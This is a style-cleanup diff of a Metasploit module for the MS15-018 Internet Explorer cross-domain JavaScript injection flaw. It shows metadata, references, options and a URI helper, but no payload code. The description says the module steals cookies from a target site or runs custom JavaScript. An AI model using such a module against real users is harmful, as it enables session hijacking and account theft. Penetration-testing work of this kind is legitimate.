@@ -6,41 +6,48 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
+        'Description' => %q{
           This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
           Explorer 10 and 11. By default, you will steal the cookie from TARGET_URI (which cannot
           have X-Frame-Options or it will fail). You can also have your own custom JavaScript
           by setting the CUSTOMJS option. Lastly, you might need to configure the URIHOST option if
           you are behind NAT.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'David Leo',      # Original discovery
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'David Leo', # Original discovery
           'filedescriptor', # PoC
           'joev',           # He figured it out really
           'sinn3r'          # MSF
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2015-0072' ],
           [ 'OSVDB', '117876' ],
           [ 'MSB', 'MS15-018' ],
           [ 'URL', 'http://innerht.ml/blog/ie-uxss.html' ],
           [ 'URL', 'https://seclists.org/fulldisclosure/2015/Feb/10' ]
         ],
-      'Platform'       => 'win',
-      'DisclosureDate' => '2015-02-01'
-    ))
+        'Platform' => 'win',
+        'DisclosureDate' => '2015-02-01',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
-    [
-      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
-      OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])
-    ])
+      [
+        OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
+        OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])
+      ]
+    )
   end
 
   def setup
@@ -63,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
     @ninja ||= "#{Rex::Text.rand_text_alpha(5)}.php"
   end
 
-  def get_uri(cli=self.cli)
+  def get_uri(cli = self.cli)
     ssl = datastore["SSL"]
     proto = (ssl ? "https://" : "http://")
     if datastore['URIHOST']
